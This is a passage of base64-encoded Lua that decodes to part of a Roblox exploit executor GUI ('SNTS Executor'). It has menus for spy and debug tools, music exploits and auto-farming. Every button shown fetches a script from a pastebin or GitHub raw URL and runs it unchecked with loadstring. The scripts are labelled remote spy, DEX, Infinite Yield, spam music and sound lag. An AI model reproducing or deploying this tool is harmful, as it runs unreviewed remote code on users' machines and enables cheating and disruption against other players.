xDb2xvclNlcXVlbmNlS2V5cG9pbnQubmV3KDAuMjYxLCBDb2xvcjMuZnJvbVJHQig4MCwgMCwgMCkpLENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMC42MTgsIENvbG9yMy5mcm9tUkdCKDEyMCwgMCwgMCkpLENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMC45ODgsIENvbG9yMy5mcm9tUkdCKDE3MSwgMCwgMCkpLENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMC45OTcsIENvbG9yMy5mcm9tUkdCKDE5OCwgMCwgMCkpLENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMS4wMDAsIENvbG9yMy5mcm9tUkdCKDI1NSwgMCwgMCkpfTsKCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuU2NyaXB0LkNNRC5TcHkmRGVidWdzCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KCmxvY2FsIEh0dHBTZXJ2aWNlID0gZ2FtZTpHZXRTZXJ2aWNlKCJIdHRwU2VydmljZSIpCmxvY2FsIFNweURlYnVnc0ZyYW1lID0gRzJMWyIxMjQiXSAtLSBUaGUgU2Nyb2xsaW5nRnJhbWUgZm9yIFNweSAmIERlYnVncwoKLS0gSGVscGVyIGZ1bmN0aW9uIHRvIGNyZWF0ZSBidXR0b25zCmxvY2FsIGZ1bmN0aW9uIGNyZWF0ZVVJQnV0dG9uKG5hbWUsIHVybCwgaXNBZGRvbikKCWxvY2FsIGJ1dHRvbiA9IEluc3RhbmNlLm5ldygiVGV4dEJ1dHRvbiIpCglidXR0b24uU2l6ZSA9IFVEaW0yLm5ldygwLCAzNjAsIDAsIDQ5KQoJYnV0dG9uLkJhY2tncm91bmRDb2xvcjMgPSBpc0FkZG9uIGFuZCBDb2xvcjMuZnJvbVJHQig2MCwgMzAsIDMwKSBvciBDb2xvcjMuZnJvbVJHQigzNywgMzcsIDM3KQoJYnV0dG9uLkJvcmRlclNpemVQaXhlbCA9IDAKCWJ1dHRvbi5UZXh0ID0gIiIKCWJ1dHRvbi5QYXJlbnQgPSBTcHlEZWJ1Z3NGcmFtZQoKCWxvY2FsIGNvcm5lciA9IEluc3RhbmNlLm5ldygiVUlDb3JuZXIiLCBidXR0b24pCgoJbG9jYWwgbGFiZWwgPSBJbnN0YW5jZS5uZXcoIlRleHRMYWJlbCIpCglsYWJlbC5BbmNob3JQb2ludCA9IFZlY3RvcjIubmV3KDAuNSwgMC41KQoJbGFiZWwuUG9zaXRpb24gPSBVRGltMi5uZXcoMC41LCAwLCAwLjUsIDApCglsYWJlbC5TaXplID0gVURpbTIubmV3KDAsIDMwMCwgMCwgNDApCglsYWJlbC5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQoJbGFiZWwuVGV4dCA9IG5hbWUKCWxhYmVsLkZvbnQgPSBFbnVtLkZvbnQuR290aGFtQm9sZAoJbGFiZWwuVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpCglsYWJlbC5UZXh0U2NhbGVkID0gdHJ1ZQoJbGFiZWwuUGFyZW50ID0gYnV0dG9uCgoJLS0gV2hlbiBjbGlja2VkOiBmZXRjaCBhbmQgZXhlY3V0ZSBzY3JpcHQKCWJ1dHRvbi5Nb3VzZUJ1dHRvbjFDbGljazpDb25uZWN0KGZ1bmN0aW9uKCkKCQlsYWJlbC5UZXh0ID0gIkxvYWRpbmcuLi4iCgkJdGFzay5zcGF3bihmdW5jdGlvbigpCgkJCWxvY2FsIHN1Y2Nlc3MsIHJlc3BvbnNlID0gcGNhbGwoZnVuY3Rpb24oKQoJCQkJcmV0dXJuIGdhbWU6SHR0cEdldCh1cmwpCgkJCWVuZCkKCQkJaWYgc3VjY2VzcyB0aGVuCgkJCQlsb2NhbCBydW5TdWNjZXNzLCBlcnIgPSBwY2FsbChmdW5jdGlvbigpCgkJCQkJbG9hZHN0cmluZyhyZXNwb25zZSkoKQoJCQkJZW5kKQoJCQkJaWYgcnVuU3VjY2VzcyB0aGVuCgkJCQkJbGFiZWwuVGV4dCA9IG5hbWUgLi4gIiIKCQkJCQl0YXNrLndhaXQoMS41KQoJCQkJCWxhYmVsLlRleHQgPSBuYW1lCgkJCQkJLS0gcHJpbnQoIltTTlRTIFNweSAmIERlYnVnc10gTG9hZGVkOiIsIG5hbWUpCgkJCQllbHNlCgkJCQkJbGFiZWwuVGV4dCA9ICLimqDvuI8gRXJyb3IiCgkJCQkJLS0gd2FybigiW1NOVFMgRVJST1JdIEZhaWxlZCB0byBleGVjdXRlOiIsIG5hbWUsIGVycikKCQkJCWVuZAoJCQllbHNlCgkJCQlsYWJlbC5UZXh0ID0gIkZhaWxlZCIKCQkJCS0tIHdhcm4oIltTTlRTIEVSUk9SXSBGYWlsZWQgdG8gZmV0Y2g6IiwgbmFtZSkKCQkJZW5kCgkJZW5kKQoJZW5kKQplbmQKCi0tIERlZmluZSBoZWxwZXIgZnVuY3Rpb25zCmZ1bmN0aW9uIHNweUJ1dHRvbihuYW1lLCB1cmwpCgljcmVhdGVVSUJ1dHRvbihuYW1lLCB1cmwsIGZhbHNlKQplbmQKCmZ1bmN0aW9uIHNweUFkZG9uKG5hbWUsIHVybCkKCWNyZWF0ZVVJQnV0dG9uKG5hbWUsIHVybCwgdHJ1ZSkKZW5kCgotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCi0tIFtTTlRTIEVYRUNVVE9SXSBTUFkgJiBERUJVR1MgU0NSSVBUIExJU1QKLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQoKc3B5QnV0dG9uKCJSRU1PVEUgU1BZIiwgImh0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy96MWpLVHNtQyIpCnNweUJ1dHRvbigiREVYIiwgImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9pbmZ5aWZmL2JhY2t1cC9tYWluL2RleC5sdWEiKQpzcHlCdXR0b24oIklORklOSVRFIFlJRUxEIiwgImh0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy9FWWdFUEpqciIpCgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuU2NyaXB0LkNNRC5NdXNpYyZTb3VuZApHMkxbIjEzNiJdID0gSW5zdGFuY2UubmV3KCJJbWFnZUxhYmVsIiwgRzJMWyJmOSJdKTsKRzJMWyIxMzYiXVsiQm9yZGVyU2l6ZVBpeGVsIl0gPSAwOwpHMkxbIjEzNiJdWyJCYWNrZ3JvdW5kQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KTsKRzJMWyIxMzYiXVsiQW5jaG9yUG9pbnQiXSA9IFZlY3RvcjIubmV3KDEsIDApOwpHMkxbIjEzNiJdWyJJbWFnZSJdID0gW1tyYnhhc3NldGlkOi8vNzIwMzc2Njc1NDE4ODBdXTsKRzJMWyIxMzYiXVsiU2l6ZSJdID0gVURpbTIubmV3KDAsIDUyOCwgMCwgNDMyKTsKRzJMWyIxMzYiXVsiQm9yZGVyQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigwLCAwLCAwKTsKRzJMWyIxMzYiXVsiQmFja2dyb3VuZFRyYW5zcGFyZW5jeSJdID0gMTsKRzJMWyIxMzYiXVsiTmFtZSJdID0gW1tNdXNpYyZTb3VuZF1dOwpHMkxbIjEzNiJdWyJQb3NpdGlvbiJdID0gVURpbTIubmV3KDAuOTA0OTUsIDAsIDAuMDYwNDksIDApOwoKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLlNjcmlwdC5DTUQuTXVzaWMmU291bmQuRGlzcGxheU5hbWUKRzJMWyIxMzciXSA9IEluc3RhbmNlLm5ldygiVGV4dExhYmVsIiwgRzJMWyIxMzYiXSk7CkcyTFsiMTM3Il1bIkJvcmRlclNpemVQaXhlbCJdID0gMDsKRzJMWyIxMzciXVsiVGV4dFNpemUiXSA9IDI1OwpHMkxbIjEzNyJdWyJCYWNrZ3JvdW5kQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KTsKRzJMWyIxMzciXVsiRm9udEZhY2UiXSA9IEZvbnQubmV3KFtbcmJ4YXNzZXQ6Ly9mb250cy9mYW1pbGllcy9Hb3RoYW1TU20uanNvbl1dLCBFbnVtLkZvbnRXZWlnaHQuQm9sZCwgRW51bS5Gb250U3R5bGUuTm9ybWFsKTsKRzJMWyIxMzciXVsiVGV4dENvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSk7CkcyTFsiMTM3Il1bIkJhY2tncm91bmRUcmFuc3BhcmVuY3kiXSA9IDE7CkcyTFsiMTM3Il1bIkFuY2hvclBvaW50Il0gPSBWZWN0b3IyLm5ldygwLjUsIDApOwpHMkxbIjEzNyJdWyJTaXplIl0gPSBVRGltMi5uZXcoMCwgMjAwLCAwLCA1MCk7CkcyTFsiMTM3Il1bIkJvcmRlckNvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMCwgMCwgMCk7CkcyTFsiMTM3Il1bIlRleHQiXSA9IFtbTVVTSUMgJiBTT1VORCBFWFBMT0lUXV07CkcyTFsiMTM3Il1bIk5hbWUiXSA9IFtbRGlzcGxheU5hbWVdXTsKRzJMWyIxMzciXVsiUG9zaXRpb24iXSA9IFVEaW0yLm5ldygwLjUsIDAsIDAsIDApOwoKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLlNjcmlwdC5DTUQuTXVzaWMmU291bmQuU2Nyb2xsaW5nRnJhbWUKRzJMWyIxMzgiXSA9IEluc3RhbmNlLm5ldygiU2Nyb2xsaW5nRnJhbWUiLCBHMkxbIjEzNiJdKTsKRzJMWyIxMzgiXVsiQWN0aXZlIl0gPSB0cnVlOwpHMkxbIjEzOCJdWyJCb3JkZXJTaXplUGl4ZWwiXSA9IDA7CkcyTFsiMTM4Il1bIkJhY2tncm91bmRDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpOwpHMkxbIjEzOCJdWyJTY3JvbGxCYXJJbWFnZVRyYW5zcGFyZW5jeSJdID0gMTsKRzJMWyIxMzgiXVsiQW5jaG9yUG9pbnQiXSA9IFZlY3RvcjIubmV3KDAuNSwgMC41KTsKRzJMWyIxMzgiXVsiU2l6ZSJdID0gVURpbTIubmV3KDAsIDQzOSwgMCwgMjg5KTsKRzJMWyIxMzgiXVsiU2Nyb2xsQmFySW1hZ2VDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDI0MSwgMjQxLCAyNDEpOwpHMkxbIjEzOCJdWyJQb3NpdGlvbiJdID0gVURpbTIubmV3KDAuNSwgMCwgMC41LCAwKTsKRzJMWyIxMzgiXVsiQm9yZGVyQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigwLCAwLCAwKTsKRzJMWyIxMzgiXVsiU2Nyb2xsQmFyVGhpY2tuZXNzIl0gPSA1OwpHMkxbIjEzOCJdWyJCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5Il0gPSAxOwoKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLlNjcmlwdC5DTUQuTXVzaWMmU291bmQuU2Nyb2xsaW5nRnJhbWUuVUlMaXN0TGF5b3V0CkcyTFsiMTM5Il0gPSBJbnN0YW5jZS5uZXcoIlVJTGlzdExheW91dCIsIEcyTFsiMTM4Il0pOwpHMkxbIjEzOSJdWyJIb3Jpem9udGFsQWxpZ25tZW50Il0gPSBFbnVtLkhvcml6b250YWxBbGlnbm1lbnQuQ2VudGVyOwpHMkxbIjEzOSJdWyJQYWRkaW5nIl0gPSBVRGltLm5ldygwLCA2KTsKRzJMWyIxMzkiXVsiU29ydE9yZGVyIl0gPSBFbnVtLlNvcnRPcmRlci5MYXlvdXRPcmRlcjsKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLlNjcmlwdC5DTUQuTXVzaWMmU291bmQuVUlHcmFkaWVudApHMkxbIjE0OSJdID0gSW5zdGFuY2UubmV3KCJVSUdyYWRpZW50IiwgRzJMWyIxMzYiXSk7CkcyTFsiMTQ5Il1bIlJvdGF0aW9uIl0gPSAtOTA7CkcyTFsiMTQ5Il1bIkNvbG9yIl0gPSBDb2xvclNlcXVlbmNlLm5ld3tDb2xvclNlcXVlbmNlS2V5cG9pbnQubmV3KDAuMDAwLCBDb2xvcjMuZnJvbVJHQig1OCwgMCwgMCkpLENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMC4yNjEsIENvbG9yMy5mcm9tUkdCKDgwLCAwLCAwKSksQ29sb3JTZXF1ZW5jZUtleXBvaW50Lm5ldygwLjYxOCwgQ29sb3IzLmZyb21SR0IoMTIwLCAwLCAwKSksQ29sb3JTZXF1ZW5jZUtleXBvaW50Lm5ldygwLjk4OCwgQ29sb3IzLmZyb21SR0IoMTcxLCAwLCAwKSksQ29sb3JTZXF1ZW5jZUtleXBvaW50Lm5ldygwLjk5NywgQ29sb3IzLmZyb21SR0IoMTk4LCAwLCAwKSksQ29sb3JTZXF1ZW5jZUtleXBvaW50Lm5ldygxLjAwMCwgQ29sb3IzLmZyb21SR0IoMjU1LCAwLCAwKSl9OwoKLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQotLS8vIFtTTlRTIEVYRUNVVE9SXSBNVVNJQyAmIFNPVU5EIENPTk5FQ1RFRCBTQ1JJUFQgQlVUVE9OUwotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCgpsb2NhbCBIdHRwU2VydmljZSA9IGdhbWU6R2V0U2VydmljZSgiSHR0cFNlcnZpY2UiKQpsb2NhbCBNdXNpY1NvdW5kRnJhbWUgPSBHMkxbIjEzOCJdIC0tIFNjcm9sbGluZ0ZyYW1lIGZvciBNdXNpYyAmIFNvdW5kCgotLSBIZWxwZXIgdG8gY3JlYXRlIE11c2ljICYgU291bmQgYnV0dG9ucwpsb2NhbCBmdW5jdGlvbiBjcmVhdGVNdXNpY0J1dHRvbihuYW1lLCB1cmwsIGlzQWRkb24pCglsb2NhbCBidXR0b24gPSBJbnN0YW5jZS5uZXcoIlRleHRCdXR0b24iKQoJYnV0dG9uLlNpemUgPSBVRGltMi5uZXcoMCwgMzYwLCAwLCA0OSkKCWJ1dHRvbi5CYWNrZ3JvdW5kQ29sb3IzID0gaXNBZGRvbiBhbmQgQ29sb3IzLmZyb21SR0IoNjAsIDMwLCAzMCkgb3IgQ29sb3IzLmZyb21SR0IoMzcsIDM3LCAzNykKCWJ1dHRvbi5Cb3JkZXJTaXplUGl4ZWwgPSAwCglidXR0b24uVGV4dCA9ICIiCglidXR0b24uUGFyZW50ID0gTXVzaWNTb3VuZEZyYW1lCgoJbG9jYWwgY29ybmVyID0gSW5zdGFuY2UubmV3KCJVSUNvcm5lciIsIGJ1dHRvbikKCglsb2NhbCBsYWJlbCA9IEluc3RhbmNlLm5ldygiVGV4dExhYmVsIikKCWxhYmVsLkFuY2hvclBvaW50ID0gVmVjdG9yMi5uZXcoMC41LCAwLjUpCglsYWJlbC5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLjUsIDAsIDAuNSwgMCkKCWxhYmVsLlNpemUgPSBVRGltMi5uZXcoMCwgMzAwLCAwLCA0MCkKCWxhYmVsLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCglsYWJlbC5UZXh0ID0gbmFtZQoJbGFiZWwuRm9udCA9IEVudW0uRm9udC5Hb3RoYW1Cb2xkCglsYWJlbC5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSkKCWxhYmVsLlRleHRTY2FsZWQgPSB0cnVlCglsYWJlbC5QYXJlbnQgPSBidXR0b24KCgktLSBXaGVuIGNsaWNrZWQ6IEZldGNoIGFuZCBleGVjdXRlIHNjcmlwdAoJYnV0dG9uLk1vdXNlQnV0dG9uMUNsaWNrOkNvbm5lY3QoZnVuY3Rpb24oKQoJCWxhYmVsLlRleHQgPSAiTG9hZGluZy4uLiIKCQl0YXNrLnNwYXduKGZ1bmN0aW9uKCkKCQkJbG9jYWwgc3VjY2VzcywgcmVzcG9uc2UgPSBwY2FsbChmdW5jdGlvbigpCgkJCQlyZXR1cm4gZ2FtZTpIdHRwR2V0KHVybCkKCQkJZW5kKQoJCQlpZiBzdWNjZXNzIHRoZW4KCQkJCWxvY2FsIHJ1blN1Y2Nlc3MsIGVyciA9IHBjYWxsKGZ1bmN0aW9uKCkKCQkJCQlsb2Fkc3RyaW5nKHJlc3BvbnNlKSgpCgkJCQllbmQpCgkJCQlpZiBydW5TdWNjZXNzIHRoZW4KCQkJCQlsYWJlbC5UZXh0ID0gbmFtZSAuLiAiIgoJCQkJCXRhc2sud2FpdCgxLjUpCgkJCQkJbGFiZWwuVGV4dCA9IG5hbWUKCQkJCQktLSBwcmludCgiW1NOVFMgTXVzaWMgJiBTb3VuZF0gTG9hZGVkOiIsIG5hbWUpCgkJCQllbHNlCgkJCQkJbGFiZWwuVGV4dCA9ICLimqDvuI8gRXJyb3IiCgkJCQkJLS0gd2FybigiW1NOVFMgRVJST1JdIEZhaWxlZCB0byBleGVjdXRlOiIsIG5hbWUsIGVycikKCQkJCWVuZAoJCQllbHNlCgkJCQlsYWJlbC5UZXh0ID0gIkZhaWxlZCIKCQkJCS0tIHdhcm4oIltTTlRTIEVSUk9SXSBGYWlsZWQgdG8gZmV0Y2g6IiwgbmFtZSkKCQkJZW5kCgkJZW5kKQoJZW5kKQplbmQKCi0tIEVhc3ktdG8tdXNlIGhlbHBlcnMKZnVuY3Rpb24gbXVzaWNCdXR0b24obmFtZSwgdXJsKQoJY3JlYXRlTXVzaWNCdXR0b24obmFtZSwgdXJsLCBmYWxzZSkKZW5kCgpmdW5jdGlvbiBtdXNpY0FkZG9uKG5hbWUsIHVybCkKCWNyZWF0ZU11c2ljQnV0dG9uKG5hbWUsIHVybCwgdHJ1ZSkKZW5kCgotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCi0tLy8gW1NOVFMgRVhFQ1VUT1JdIE1VU0lDICYgU09VTkQgU0NSSVBUIExJU1QKLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQoKbXVzaWNCdXR0b24oIk1VU0lDIEVYUExPSVQiLCAiaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3LzhOTnhreGVYIikKbXVzaWNCdXR0b24oIlNQQU0gTVVTSUMgRVhQTE9JVCIsICJodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvd1BCSzZQbVkiKQptdXNpY0J1dHRvbigiU09VTkQgTEFHIiwgImh0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy9CRDJHN1RDMCIpCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5TY3JpcHQuQ01ELkF1dG9GYXJtCkcyTFsiMTRhIl0gPSBJbnN0YW5jZS5uZXcoIkltYWdlTGFiZWwiLCBHMkxbImY5Il0pOwpHMkxbIjE0YSJdWyJCb3JkZXJTaXplUGl4ZWwiXSA9IDA7CkcyTFsiMTRhIl1bIkJhY2tncm91bmRDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpOwpHMkxbIjE0YSJdWyJBbmNob3JQb2ludCJdID0gVmVjdG9yMi5uZXcoMSwgMSk7CkcyTFsiMTRhIl1bIkltYWdlIl0gPSBbW3JieGFzc2V0aWQ6Ly83OTc1ODE3OTc4NzMyNV1dOwpHMkxbIjE0YSJdWyJTaXplIl0gPSBVRGltMi5uZXcoMCwgNTQ5LCAwLCA1NTYpOwpHMkxbIjE0YSJdWyJCb3JkZXJDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDAsIDAsIDApOwpHMkxbIjE0YSJdWyJCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5Il0gPSAxOwpHMkxbIjE0YSJdWyJOYW1lIl0gPSBbW0F1dG9GYXJtXV07CkcyTFsiMTRhIl1bIlBvc2l0aW9uIl0gPSBVRGltMi5uZXcoMC45MTA3MywgMCwgMC45MjgzMywgMCk7CgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuU2NyaXB0LkNNRC5BdXRvRmFybS5EaXNwbGF5TmFtZQpHMkxbIjE0YiJdID0gSW5zdGFuY2UubmV3KCJUZXh0TGFiZWwiLCBHMkxbIjE0YSJdKTsKRzJMWyIxNGIiXVsiQm9yZGVyU2l6ZVBpeGVsIl0gPSAwOwpHMkxbIjE0YiJdWyJUZXh0U2l6ZSJdID0gMjU7CkcyTFsiMTRiIl1bIkJhY2tncm91bmRDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpOwpHMkxbIjE0YiJdWyJGb250RmFjZSJdID0gRm9udC5uZXcoW1tyYnhhc3NldDovL2ZvbnRzL2ZhbWlsaWVzL0dvdGhhbVNTbS5qc29uXV0sIEVudW0uRm9udFdlaWdodC5Cb2xkLCBFbnVtLkZvbnRTdHlsZS5Ob3JtYWwpOwpHMkxbIjE0YiJdWyJUZXh0Q29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KTsKRzJMWyIxNGIiXVsiQmFja2dyb3VuZFRyYW5zcGFyZW5jeSJdID0gMTsKRzJMWyIxNGIiXVsiQW5jaG9yUG9pbnQiXSA9IFZlY3RvcjIubmV3KDAuNSwgMCk7CkcyTFsiMTRiIl1bIlNpemUiXSA9IFVEaW0yLm5ldygwLCAyMDAsIDAsIDUwKTsKRzJMWyIxNGIiXVsiQm9yZGVyQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigwLCAwLCAwKTsKRzJMWyIxNGIiXVsiVGV4dCJdID0gW1tBVVRPIEZBUk1dXTsKRzJMWyIxNGIiXVsiTmFtZSJdID0gW1tEaXNwbGF5TmFtZV1dOwpHMkxbIjE0YiJdWyJQb3NpdGlvbiJdID0gVURpbTIubmV3KDAuNSwgMCwgMCwgMCk7CgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuU2NyaXB0LkNNRC5BdXRvRmFybS5TY3JvbGxpbmdGcmFtZQpHMkxbIjE0YyJdID0gSW5zdGFuY2UubmV3KCJTY3JvbGxpbmdGcmFtZSIsIEcyTFsiMTRhIl0pOwpHMkxbIjE0YyJdWyJBY3RpdmUiXSA9IHRydWU7CkcyTFsiMTRjIl1bIkJvcmRlclNpemVQaXhlbCJdID0gMDsKRzJMWyIxNGMiXVsiQmFja2dyb3VuZENvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSk7CkcyTFsiMTRjIl1bIlNjcm9sbEJhckltYWdlVHJhbnNwYXJlbmN5Il0gPSAxOwpHMkxbIjE0YyJdWyJBbmNob3JQb2ludCJdID0gVmVjdG9yMi5uZXcoMC41LCAwLjUpOwpHMkxbIjE0YyJdWyJTaXplIl0gPSBVRGltMi5uZXcoMCwgNDU2LCAwLCA0MjEpOwpHMkxbIjE0YyJdWyJTY3JvbGxCYXJJbWFnZUNvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMjQxLCAyNDEsIDI0MSk7CkcyTFsiMTRjIl1bIlBvc2l0aW9uIl0gPSBVRGltMi5uZXcoMC41LCAwLCAwLjUsIDApOwpHMkxbIjE0YyJdWyJCb3JkZXJDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDAsIDAsIDApOwpHMkxbIjE0YyJdWyJTY3JvbGxCYXJUaGlja25lc3MiXSA9IDU7CkcyTFsiMTRjIl1bIkJhY2tncm91bmRUcmFuc3BhcmVuY3kiXSA9IDE7CgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuU2NyaXB0LkNNRC5BdXRvRmFybS5TY3JvbGxpbmdGcmFtZS5VSUxpc3RMYXlvdXQKRzJMWyIxNGQiXSA9IEluc3RhbmNlLm5ldygiVUlMaXN0TGF5b3V0IiwgRzJMWyIxNGMiXSk7CkcyTFsiMTRkIl1bIkhvcml6b250YWxBbGlnbm1lbnQiXSA9IEVudW0uSG9yaXpvbnRhbEFsaWdubWVudC5DZW50ZXI7CkcyTFsiMTRkIl1bIlBhZGRpbmciXSA9IFVEaW0ubmV3KDAsIDYpOwpHMkxbIjE0ZCJdWyJTb3J0T3JkZXIiXSA9IEVudW0uU29ydE9yZGVyLkxheW91dE9yZGVyOwoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuU2NyaXB0LkNNRC5BdXRvRmFybS5VSUdyYWRpZW50CkcyTFsiMTYzIl0gPSBJbnN0YW5jZS5uZXcoIlVJR3JhZGllbnQiLCBHMkxbIjE0YSJdKTsKRzJMWyIxNjMiXVsiUm90YXRpb24iXSA9IC05MDsKRzJMWyIxNjMiXVsiQ29sb3IiXSA9IENvbG9yU2VxdWVuY2UubmV3e0NvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMC4wMDAsIENvbG9yMy5mcm9tUkdCKDU4LCAwLCAwKSksQ29sb3JTZXF1ZW5jZUtleXBvaW50Lm5ldygwLjI2MSwgQ29sb3IzLmZyb21SR0IoODAsIDAsIDApKSxDb2xvclNlcXVlbmNlS2V5cG9pbnQubmV3KDAuNjE4LCBDb2xvcjMuZnJvbVJHQigxMjAsIDAsIDApKSxDb2xvclNlcXVlbmNlS2V5cG9pbnQubmV3KDAuOTg4LCBDb2xvcjMuZnJvbVJHQigxNzEsIDAsIDApKSxDb2xvclNlcXVlbmNlS2V5cG9pbnQubmV3KDAuOTk3LCBDb2xvcjMuZnJvbVJHQigxOTgsIDAsIDApKSxDb2xvclNlcXVlbmNlS2V5cG9pbnQubmV3KDEuMDAwLCBDb2xvcjMuZnJvbVJHQigyNTUsIDAsIDApKX07CgotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCi0tLy8gW1NOVFMgRVhFQ1VUT1JdIEFVVE8gRkFSTSBDT05ORUNURUQgU0NSSVBUIEJVVFRPTlMKLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQoKbG9jYWwgSHR0cFNlcnZpY2UgPSBnYW1lOkdldFNlcnZpY2UoIkh0dHBTZXJ2aWNlIikKbG9jYWwgQXV0b0Zhcm1GcmFtZSA9IEcyTFsiMTRjIl0gLS0gUmVmZXJlbmNlIHRvIHRoZSBBdXRvRmFybSBTY3JvbGxpbmdGcmFtZQoKLS0gSGVscGVyIHRvIGNyZWF0ZSBBdXRvRmFybSBidXR0b25zCmxvY2FsIGZ1bmN0aW9uIGNyZWF0ZUF1dG9GYXJtQnV0dG9uKG5hbWUsIHVybCwgaXNBZGRvbikKCWxvY2FsIGJ1dHRvbiA9IEluc3RhbmNlLm5ldygiVGV4dEJ1dHRvbiIpCglidXR0b24uU2l6ZSA9IFVEaW0yLm5ldygwLCAzNjAsIDAsIDQ5KQoJYnV0dG9uLkJhY2tncm91bmRDb2xvcjMgPSBpc0FkZG9uIGFuZCBDb2xvcjMuZnJvbVJHQig2MCwgMzAsIDMwKSBvciBDb2xvcjMuZnJvbVJHQigzNywgMzcsIDM3KQoJYnV0dG9uLkJvcmRlclNpemVQaXhlbCA9IDAKCWJ1dHRvbi5UZXh0ID0gIiIKCWJ1dHRvbi5QYXJlbnQgPSBBdXRvRmFybUZyYW1lCgoJbG9jYWwgY29ybmVyID0gSW5zdGFuY2UubmV3KCJVSUNvcm5lciIsIGJ1dHRvbikKCglsb2NhbCBsYWJlbCA9IEluc3RhbmNlLm5ldygiVGV4dExhYmVsIikKCWxhYmVsLkFuY2hvclBvaW50ID0gVmVjdG9yMi5uZXcoMC41LCAwLjUpCglsYWJlbC5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLjUsIDAsIDAuNSwgMCkKCWxhYmVsLlNpemUgPSBVRGltMi5uZXcoMCwgMzAwLCAwLCA0MCkKCWxhYmVsLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCglsYWJlbC5UZXh0ID0gbmFtZQoJbGFiZWwuRm9udCA9IEVudW0uRm9udC5Hb3RoYW1Cb2xkCglsYWJlbC5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSkKCWxhYmVsLlRleHRTY2FsZWQgPSB0cnVlCglsYWJlbC5QYXJlbnQgPSBidXR0b24KCgktLSBXaGVuIGNsaWNrZWQ6IEZldGNoIGFuZCBleGVjdXRlIHNjcmlwdAoJYnV0dG9uLk1vdXNlQnV0dG9uMU